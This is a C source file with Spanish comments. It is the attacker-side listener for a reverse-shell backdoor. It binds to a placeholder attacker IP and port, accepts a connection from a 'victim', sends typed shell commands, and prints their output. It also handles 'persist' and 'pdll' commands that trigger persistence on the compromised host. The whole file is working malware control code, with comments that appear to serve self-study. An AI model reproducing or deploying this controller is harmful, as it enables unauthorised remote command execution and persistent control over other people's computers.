#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
/*It is a type definition for length and size values used by socket related parameters, return values and structure members. 
Such definitions are used to allow platform independant source files. The header file where it is defined (sys/socket.h) 
may use different definitions according to the target platform (e.g. for 16, 32, and 64 bit CPUs).
*/
//SO_REUSEADDR = https://programmerclick.com/article/98311782368/
//setsockpot = pone una opción en un socket - https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-setsockopt (contiene SO_REUSEADDR entr otros parámetors) 
//bind() = asocia una dirección local con un socket - https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind
//accept() = https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept
//inet_ntoa() = https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_ntoa - transforma una red a internet IPv4 a una string ASCII en el formato dotted-decimal
//MSG_WAITALL = flag que dice al programa que bloquee la operación hasta que la request quede satisfecha
//recv() = https://pubs.opengroup.org/onlinepubs/007904975/functions/recv.html#:~:text=The%20recv()%20function%20shall,source%20address%20of%20received%20data.&text=Specifies%20the%20socket%20file%20descriptor.

int main(){
	int sock, client_socket;//almacena socket propio y el del cliente (victima)
	char buffer[1024];//para transportar el comando
	char response[18384];//mismo tamaño que el response de backdoor - aqui se almacena el response que envie el backdoor
	struct sockaddr_in server_address, client_address;//para configurar el socket del server, como para acpetar el del cliente
	int i = 0;
	int optval = 1;
	socklen_t client_length;
	unsigned short ServPort;
	char *ServIP;
	
	ServIP = $$IP_ATC
	ServPort = $$PORT

	sock =  socket(AF_INET, SOCK_STREAM, 0);

	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
		printf("Error setting TCP socket options!\n");
		return 1;
	}


	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr(ServIP);
	server_address.sin_port = htons(ServPort);

	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));//binding server ip and it's port
	listen(sock, 5);//funcion para escuchar la respuesta, pilla como argumentos el socket (en el que estamos escuchando) y el número de conexiones que queremos aceptar
	client_length = sizeof(client_address);//se le guarda el tamanyo de la dirección del cliente
	client_socket = accept(sock, (struct sockaddr *) &server_address, &client_length); //aceptar el request de conexión, llamando la función accept y guardar el return de esta en client_socket que luego usaremos para comunicarnos con el target

	while(1){
		jump:
		bzero(&buffer, sizeof(buffer));//puesto que el servidor se va a ejecutar desde linux no es necesario definirlo, en caso de que se haga desde windows sí que hará falta
		bzero(&response, sizeof(response));
		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));//print que se mostrará la consola, el %s se puede remplazar por un string, tras eso se displayea la ip de la "victima"
		fgets(buffer, sizeof(buffer), stdin);//guarda comando escrito en buffer
		strtok(buffer, "\n");//de lugar específico remueve carácter en concreto
		write(client_socket, buffer, sizeof(buffer));//funciona igual que send, sirve para enviarle los comandos al target, de parámetros pilla el socket del target, el archivo con el comando y su tamaño
		if (strncmp("q", buffer, 1) == 0) {
			break;
		}
		else if (strncmp("cd ", buffer, 3) == 0){
			goto jump;
		}
		else if (strncmp("persist", buffer, 7) == 0){
			recv(client_socket, response, sizeof(response), 0); //guarda la respuesta del cliente en response
			printf("%s", response);
		}
		else if (strncmp("pdll", buffer, 4) == 0){
			printf("en caso de que no recibas nada es que la persistencia ha tenido exito");
			recv(client_socket, response, sizeof(response), 0);
			printf("%s", response);
		}
		//con persistencia no es necesario establecer un strncmp ya que devuelve elementos a la consola evitando que nos quedemos esperando
		//igual que en backdoor, se utiliza strncmp para ver si se ha puesto una q, en ese caso se rompe el bucle de introducir comandos 
		else{
			recv(client_socket, response, sizeof(response), MSG_WAITALL);//recibe la respuesta del comando instertado, empleando el socket del cliente, lo almacena en response, MSG_WAITALL explicado arriba
			printf("%s", response);
		}
	}
}
